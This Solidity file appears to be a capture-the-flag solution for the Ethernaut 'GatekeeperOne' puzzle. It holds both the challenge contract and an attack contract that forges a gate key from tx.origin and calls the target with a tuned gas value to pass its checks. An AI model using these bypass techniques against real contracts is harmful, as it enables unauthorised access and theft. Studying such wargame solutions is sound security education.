pragma solidity ^0.4.18;
contract GatekeeperOne {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(msg.gas % 8191 == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint32(_gateKey) == uint16(_gateKey));
    require(uint32(_gateKey) != uint64(_gateKey));
    require(uint32(_gateKey) == uint16(tx.origin));
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

contract GatekeeperOne_hack{
    function GatekeeperOne_hack () public {
    }
    
    function attack(address _inst) public{
        bytes8 hack = bytes8(uint(tx.origin) & 0xFFF1FFF2FFF3FFF40000FFFF);
        address(GatekeeperOne(_inst)).call.gas(215+8191*4)(bytes4(keccak256("enter(bytes8)")), hack);
    }
}

